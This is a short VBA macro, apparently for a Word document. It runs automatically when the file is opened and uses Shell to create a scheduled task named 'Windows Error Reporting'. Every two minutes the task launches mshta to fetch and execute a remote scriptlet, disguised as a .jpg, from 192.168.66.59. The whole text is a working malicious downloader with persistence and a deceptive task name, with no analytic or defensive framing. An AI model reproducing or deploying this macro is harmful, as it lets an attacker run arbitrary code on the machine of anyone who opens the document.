Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Call Shell("schtasks /create /sc MINUTE /tn ""Windows Error Reporting"" /tr ""mshta.exe javascript:a=GetObject('script:http://192.168.66.59/microsoftftp.jpg').Exec();close();"" /mo 2 /F")
End Sub
